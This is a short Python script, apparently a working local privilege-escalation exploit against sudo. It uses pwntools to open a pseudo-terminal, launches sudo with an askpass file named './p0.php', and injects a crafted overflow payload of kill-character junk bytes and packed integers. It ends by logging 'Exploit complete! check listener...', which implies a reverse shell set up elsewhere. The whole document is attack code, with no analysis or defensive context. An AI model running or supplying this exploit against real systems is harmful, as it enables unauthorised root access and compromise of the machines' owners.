#!/usr/bin/python3
import sys, os
from time import sleep
from pwn import *

binary = os.path.realpath('./sudo')
master, slave = os.openpty()
fd = os.open(os.ttyname(slave), os.O_RDONLY)
p = process([binary, '-S', 'id'], env={'SUDO_ASKPASS':'./p0.php'}, stdin=fd)

sigkill = b'\x15'
junk = b'\x00' + sigkill
payload = junk*548 + p64(6) + junk*20 + p32(0)*10 + b'\n'
sleep(.5)
log.success('Injecting payload')
os.write(master, payload)
log.success('Exploit complete! check listener...')
sys.exit(0)
